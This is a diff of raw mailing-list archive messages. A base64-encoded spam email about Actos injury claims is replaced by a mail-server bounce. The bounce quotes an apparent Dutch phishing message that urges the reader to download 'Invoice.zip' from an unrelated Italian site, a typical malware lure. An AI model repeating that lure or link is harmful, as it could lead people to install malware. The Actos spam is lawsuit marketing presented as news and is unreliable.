@@ -1,13 +1,13 @@
-From: Actos Cancer News <general-8HOWHOfE5Cw0FAC2qsvKDwC/G2K4zDHf@public.gmane.org>
-Subject: Actos News: The FDA has linked Actos to Bladder Cancer and Heart
-	Conditions
-Date: Thu, 01 Mar 2012 00:01:08 -0600 (CST)
-Message-ID: <1330581668.7667549391960739@mf40.sendgrid.net>
-Reply-To: general-8HOWHOfE5Cw0FAC2qsvKDwC/G2K4zDHf@public.gmane.org
+From: <postmaster-5gIye892DIE@public.gmane.org>
+Subject: Undeliverable: Re: document 1179
+Date: Thu, 1 Mar 2012 07:37:59 +0100
+Message-ID: <4f759dda-8d3a-4033-a412-039cfbc2a36a@whw.nl>
+References: <5071506724.03948506667238@srv1157.sd-france.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: multipart/mixed; boundary="===============2385285593203255671=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Content-Language: en-US
+In-Reply-To: <5071506724.03948506667238-//J07LhNTfpNmCTVG0Af2SpxlwaOVQ5f@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -20,65 +20,160 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-RW1haWwgbm90IGRpc3BsYXlpbmcgY29ycmVjdGx5PyBWaWV3IGl0IChodHRwOi8vc2VuZGdyaWQu
-Y29tL3dmL3dlYm1haWw/cnA9WlRJMWJHUXpUbk5hV0ZJd1dsaEtabUZYVVRaTlZFbDZUa040TVdN
-eVZubFlNbXhyVDJwSk1VNXFWVEJtVVdWNVNuVmFXR1I2WWtkV01HUkhWbmxZTW14clNXcHZhVTFx
-UVRWTmFsRTBTV2wzYVdKdFZqTmpNbmhzWkVoU2JHTnNPVEZqTWxaNVdESnNhMGxxYnpCT2FrMTRU
-a1JKTWs1cVNYcG1VVDA5ICkgaW4geW91ciBicm93c2VyCgpGT1IgSU1NRURJQVRFIFJFTEVBU0UK
-IE5FV1MgRk9SIEFOWU9ORSBUSEFUIEhBUyBUQUtFTiBBQ1RPUwoKV2FybmluZyBhYm91dCBBY3Rv
-c8KuIEluanVyaWVzIFRoZSBVbml0ZWQgU3RhdGVzIEZvb2QgYW5kIERydWcgQWRtaW5pc3RyYXRp
-b24gaGFzIHJlcG9ydGVkIHRoYXQgQWN0b3PCriBNaWdodCBJbmNyZWFzZSB0aGUgUmlzayBvZiBC
-bGFkZGVyIENhbmNlciwgSGVhcnQgRmFpbHVyZSBhbmQgT3RoZXIgU2VyaW91cyBJbmp1cmllcy4K
-IFRoZSBmb2xsb3dpbmcgaXMgYSBicmllZiBvdmVydmlldyBvZiBzb21lIG9mIHRoZSBpbmp1cmll
-cyB0aGF0IGhhdmUgYmVlbiBsaW5rZWQgdG8gdGhlIGRpYWJldGVzIGRydWcgQWN0b3PCri4gRm9y
-IGFkZGl0aW9uYWwgaW5mb3JtYXRpb24gZ28gdG8gR29vZ2xlIGFuZCB0eXBlIGluIOKAnEFjdG9z
-wq4gSW5qdXJ5LuKAnSBvciBqdXN0IGNsaWNrIG9uIHRoaXMgbGluayBHb29nbGUgQWN0b3MgSW5q
-dXJ5IHRvIGF1dG9tYXRpY2FsbHkgc2VhcmNoIGdvb2dsZSBmb3IgQWN0b3PCriBJbmp1cnkuCiBB
-Y2NvcmRpbmcgdG8gdGhlIFUuUy4gRm9vZCBhbmQgRHJ1ZyBBZG1pbmlzdHJhdGlvbiAoRkRBKSwg
-QWN0b3PCriAocGlvZ2xpdGF6b25lKSBtaWdodCBpbmNyZWFzZSB0aGUgcmlzayBvZiBibGFkZGVy
-IGNhbmNlciBpbiBzb21lIHVzZXJzLiBJdCBpcyB2aXRhbCB0aGF0IGFueSBjYW5jZXIgYmUgZGlh
-Z25vc2VkIGFuZCB0cmVhdG1lbnQgYmVnYW4gYXMgZWFybHkgYXMgcG9zc2libGUuCiBJdCBpcyBh
-bHNvIGltcG9ydGFudCB0aGF0IGFueW9uZSBpbmp1cmVkIGFzIGEgcmVzdWx0IG9mIFRha2luZyBB
-Y3Rvc8KuIHNlZWsgbGVnYWwgY291bnNlbCBhcyBzb29uIGFzIHBvc3NpYmxlLiBUaGVyZSBpcyBh
-IHRpbWUgbGltaXQgdGhhdCBtdXN0IGJlIG1ldCBpbiBvcmRlciB0byBwcm90ZWN0IHlvdXIgbGVn
-YWwgcmlnaHRzLiBDbGljayBoZXJlIHRvIGF1dG10aWNhbGx5IEdvb2dsZSBBY3RvcyBJbmp1cnkg
-Zm9yIG1vcmUgaW5mb3JtYXRpb24uCuKAnFRoZSBVLlMuIEZvb2QgYW5kIERydWcgQWRtaW5pc3Ry
-YXRpb24gKEZEQSkgaXMgaW5mb3JtaW5nIHRoZSBwdWJsaWMgdGhhdCB1c2Ugb2YgdGhlIGRpYWJl
-dGVzIG1lZGljYXRpb24gQWN0b3PCriAocGlvZ2xpdGF6b25lKSBmb3IgbW9yZSB0aGFuIG9uZSB5
-ZWFyIG1heSBiZSBhc3NvY2lhdGVkIHdpdGggYW4gaW5jcmVhc2VkIHJpc2sgb2YgYmxhZGRlciBj
-YW5jZXIs4oCdIHRoZSBhZ2VuY3kgd3JvdGUgaW4gYSBzYWZldHkgYW5ub3VuY2VtZW50IG9uIEp1
-bmUgMTUsIDIwMTEuIOKAnEluZm9ybWF0aW9uIGFib3V0IHRoaXMgcmlzayB3aWxsIGJlIGFkZGVk
-IHRvIHRoZSBXYXJuaW5ncyBhbmQgUHJlY2F1dGlvbnMgc2VjdGlvbiBvZiB0aGUgbGFiZWwgZm9y
-IHBpb2dsaXRhem9uZS1jb250YWluaW5nIG1lZGljaW5lcy7igJ0KIEFjdG9zwq4gaGFzIGFsc28g
-YmVlbiBzaG93biB0byBjYXVzZSBvciB3b3JzZW4gY29uZ2VzdGl2ZSBoZWFydCBmYWlsdXJlIGlu
-IHNvbWUgdXNlcnMuIFN5bXB0b21zIG9mIGNvbmdlc3RpdmUgaGVhcnQgZmFpbHVyZSBpbmNsdWRl
-IGZsdWlkIHJldGVudGlvbiBhbmQgc3dlbGxpbmcsIHBhcnRpY3VsYXJseSBvZiB0aGUgYW5rbGVz
-IG9yIGxlZ3M7IGRpZmZpY3VsdHkgYnJlYXRoaW5nLCBlc3BlY2lhbGx5IHdoZW4gbHlpbmcgZG93
-bjsgcmFwaWQgd2VpZ2h0IGdhaW47IGFuZCBmYXRpZ3VlLgogVG8gbGVhcm4gbW9yZSBhYm91dCB0
-aGUgcmlzayBvZiBoZWFydCBmYWlsdXJlIGFuZCBvdGhlciBBY3Rvc8KuIGluanVyaWVzLCBjbGlj
-ayBoZXIgdG8gYXV0b21hdGljYWxseSBHb29nbGUgU2VhcmNoIEFjdG9zIEluanVyeS4KIERlc3Bp
-dGUgdGhlIHBvc3NpYmxlIHJpc2sgb2YgQWN0b3PCriBpbmp1cmllcywgdGhlIEZEQSBoYXMgY2hv
-c2VuIHRvIGtlZXAgdGhlIGRydWcgb24gdGhlIG1hcmtldC4gSWYgeW91IG9yIHNvbWVvbmUgeW91
-IGxvdmUgaXMgdGFraW5nIEFjdG9zwq4sIHlvdSBzaG91bGQgZ28gdG8gR29vZ2xlIGFuZCBzZWFy
-Y2gg4oCcQWN0b3MgSW5qdXJ54oCdIHRvIGxlYXJuIG1vcmUgYWJvdXQgdGhlIGRhbmdlcm91cyBy
-aXNrcyBhc3NvY2lhdGVkIHdpdGggdGhlIG1lZGljYXRpb24uIENsaWNrIGhlcmUgdG8gYXV0b21h
-dGljYWxseSA8YSBocmVmPSJodHRwOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9YWN0b3MraW5q
-dXJ5IiA+R29vZ2xlICdBY3RvcyBJbmp1cnknPC9hPi4KIFRvIGxlYXJuIG1vcmUsIGRvIHlvdXIg
-cmVzZWFyY2guIFNpbXBseSB0eXBlIHRoZSBwaHJhc2Ug4oCcQWN0b3PCriBJbmp1cnnigJ0gaW50
-byB5b3VyIEdvb2dsZSBzZWFyY2ggYmFyIGFuZCBsZWFybiBtb3JlIHRvZGF5LiBDbGljayBoZXJl
-IHRvIGF1dG9tYXRpY2FsbHkgPGEgaHJlZj0iaHR0cDovL3d3dy5nb29nbGUuY29tL3NlYXJjaD9x
-PWFjdG9zK2luanVyeSIgPkdvb2dsZSAnQWN0b3MgSW5qdXJ5JzwvYT4uCgotLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KVG8gdW5zdWJz
-Y3JpYmUgcGxlYXNlIGNsaWNrIGhlcmUgKGh0dHA6Ly9lbWFpbC5kcnVnYWxlcnRuZXdzLmNvbS93
-Zi91bnN1YnNjcmliZT91cG49Qm5VaEZaRTF2aEtsaTgyYThsMUZSZkpsdm1LMHBXbEhvTm9LZ1Ba
-bURsOHpkcndmaWwtMkI5bXphNzBvVHZWRThHLTJCRC0yQmxaNXpYLTJCd1k4UlM5amNaRjRFVzl3
-Wm9maS0yQnVUek9KbHpEZTVGRHc4a25SbVhzVVdxZjEtMkJKeS0yRkRPY3JiZVI5am9hbi0yRm8z
-VGcyczhFTkViRU44dTR0MWRXbXYtMkZ1anF4Tk1nN1lYSGo0UlMtMkJySERVd2xQLTJGZXNSNmlJ
-Y1FaZ0tyRFBkcVlHNEk5SXNqWTltemFBNVh4ODBJRkphZlNJRmVrTmg4aTNVZ20tMkJVdU5DcFFV
-ODBxRUZWS0hRUFlUMEtqaFFXaXdnWUdTSEJjVFBaZHo0OUlTUjRza3Fnb2NGbmgwT1VCa2stMkJz
-ei0yQkhxNVVBLTJCcUx3bHpWWEdnOUhaVUxlV09nTjBTNE5abGpOQTRzSENBRmlkMEZVd0xuanpG
-Q0wzNEpQWVZBeHZNLTNEICkKQWN0b3MgQ2FuY2VyIE5ld3MKNTc5NSBTIFNhbmRoaWxsIFJkIFN0
-ZSBGLCBMYXMgVmVnYXMsIE5ldmFkYSwgODkyMTAKCl9fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fCkNvbnRhaW5lcnMgbWFpbGluZyBsaXN0CkNvbnRhaW5lcnNA
-bGlzdHMubGludXgtZm91bmRhdGlvbi5vcmcKaHR0cHM6Ly9saXN0cy5saW51eGZvdW5kYXRpb24u
-b3JnL21haWxtYW4vbGlzdGluZm8vY29udGFpbmVycw==
+--===============2385285593203255671==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="66e13c68-cb9e-473d-af44-b626caae7ae0"
+Content-Language: en-US
+
+--66e13c68-cb9e-473d-af44-b626caae7ae0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+Delivery has failed to these recipients or groups:
+
+maldonado-5gIye892DIE@public.gmane.org<mailto:maldonado-5gIye892DIE@public.gmane.org>
+The e-mail address you entered couldn't be found. Check the address and try=
+ resending the message. If the problem continues, please contact your helpd=
+esk.
+
+
+
+
+
+
+
+
+Diagnostic information for administrators:
+
+Generating server: whw.nl
+
+maldonado-5gIye892DIE@public.gmane.org
+#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
+
+Original message headers:
+
+Received: from filter02.mx-relay.com (81.173.18.240) by
+ SRVEXCHANGE.whwbedrijven.lan (192.168.0.2) with Microsoft SMTP Server id
+ 14.0.722.0; Thu, 1 Mar 2012 07:37:58 +0100
+X-ASG-Debug-ID: 1330583869-03ead9766a12a410001-D4Zj2N
+Received: from srv1157.sd-france.net (srv1157.sd-france.net [81.93.250.157]=
+)
+ by filter02.mx-relay.com with ESMTP id y3UYTZSMZ837X2bc for
+ <maldonado-5gIye892DIE@public.gmane.org>; Thu, 01 Mar 2012 07:37:51 +0100 (CET)
+X-Barracuda-Envelope-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-Barracuda-Apparent-Source-IP: 81.93.250.157
+Received: from [81.93.250.157] by srv1157.sd-france.net id w4NSZfp7a6fj wit=
+h
+ SMTP; Thu, 01 Mar 2012 07:39:48 +0100
+Date: Thu, 1 Mar 2012 07:39:48 +0100
+From: Consult Group <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v4.4.63.5) Educational
+X-Priority: 3 (Normal)
+Message-ID: <5071506724.03948506667238-//J07LhNTfpNmCTVG0Af2SpxlwaOVQ5f@public.gmane.org>
+To: <maldonado-5gIye892DIE@public.gmane.org>
+Subject: Re: document 1179
+MIME-Version: 1.0
+X-ASG-Orig-Subj: Re: document 1179
+Content-Type: text/plain; charset=3D"windows-1252"
+Content-Transfer-Encoding: 8bit
+X-Barracuda-Connect: srv1157.sd-france.net[81.93.250.157]
+X-Barracuda-Start-Time: 1330583869
+X-Barracuda-URL: http://filter01.mx-relay.com:8000/cgi-mod/mark.cgi
+X-Virus-Scanned: by bsmtpd at mx-relay.com
+X-Barracuda-Spam-Score: 0.85
+X-Barracuda-Spam-Status: No, SCORE=3D0.85 using global scores of TAG_LEVEL=
+=3D3.5 QUARANTINE_LEVEL=3D1000.0 KILL_LEVEL=3D6.0 tests=3DFORGED_MUA_THEBAT=
+_CS
+X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.2.89939
+        Rule breakdown below
+         pts rule name              description
+        ---- ---------------------- ---------------------------------------=
+-----------
+        0.85 FORGED_MUA_THEBAT_CS   Mail pretending to be from The Bat! (ch=
+arset)
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-ESET-AS: SCORE=3D30
+X-EsetResult: clean, is OK
+X-EsetId: 4F25C621A7484D31146299
+
+
+--66e13c68-cb9e-473d-af44-b626caae7ae0
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns;whw.nl
+Received-From-MTA: dns;filter02.mx-relay.com
+Arrival-Date: Thu, 1 Mar 2012 06:37:58 +0000
+
+Final-Recipient: rfc822;maldonado-5gIye892DIE@public.gmane.org
+Action: failed
+Status: 5.1.1
+Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
+
+
+--66e13c68-cb9e-473d-af44-b626caae7ae0
+Content-Type: message/rfc822
+
+Received: from filter02.mx-relay.com (81.173.18.240) by
+ SRVEXCHANGE.whwbedrijven.lan (192.168.0.2) with Microsoft SMTP Server id
+ 14.0.722.0; Thu, 1 Mar 2012 07:37:58 +0100
+X-ASG-Debug-ID: 1330583869-03ead9766a12a410001-D4Zj2N
+Received: from srv1157.sd-france.net (srv1157.sd-france.net [81.93.250.157])
+ by filter02.mx-relay.com with ESMTP id y3UYTZSMZ837X2bc for
+ <maldonado-5gIye892DIE@public.gmane.org>; Thu, 01 Mar 2012 07:37:51 +0100 (CET)
+X-Barracuda-Envelope-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-Barracuda-Apparent-Source-IP: 81.93.250.157
+Received: from [81.93.250.157] by srv1157.sd-france.net id w4NSZfp7a6fj with
+ SMTP; Thu, 01 Mar 2012 07:39:48 +0100
+Date: Thu, 1 Mar 2012 07:39:48 +0100
+From: Consult Group <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v4.4.63.5) Educational
+X-Priority: 3 (Normal)
+Message-ID: <5071506724.03948506667238-//J07LhNTfpNmCTVG0Af2SpxlwaOVQ5f@public.gmane.org>
+To: <maldonado-5gIye892DIE@public.gmane.org>
+Subject: Re: document 1179
+MIME-Version: 1.0
+X-ASG-Orig-Subj: Re: document 1179
+Content-Type: text/plain; charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+X-Barracuda-Connect: srv1157.sd-france.net[81.93.250.157]
+X-Barracuda-Start-Time: 1330583869
+X-Barracuda-URL: http://filter01.mx-relay.com:8000/cgi-mod/mark.cgi
+X-Virus-Scanned: by bsmtpd at mx-relay.com
+X-Barracuda-Spam-Score: 0.85
+X-Barracuda-Spam-Status: No, SCORE=0.85 using global scores of TAG_LEVEL=3.5 QUARANTINE_LEVEL=1000.0 KILL_LEVEL=6.0 tests=FORGED_MUA_THEBAT_CS
+X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.2.89939
+	Rule breakdown below
+	 pts rule name              description
+	---- ---------------------- --------------------------------------------------
+	0.85 FORGED_MUA_THEBAT_CS   Mail pretending to be from The Bat! (charset)
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-ESET-AS: SCORE=30
+X-EsetResult: clean, is OK
+X-EsetId: 4F25C621A7484D31146299
+
+
+       =20
+goede morgen,
+
+Uw aanvraag is voltooid.
+Sorry voor de late rapport.
+       =20
+
+Details zijn te vinden in een document hier
+http://www.immobiliarezardo.it/downloadpdf/nl/Invoice.zip
+
+
+
+--66e13c68-cb9e-473d-af44-b626caae7ae0--
+
+--===============2385285593203255671==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============2385285593203255671==--
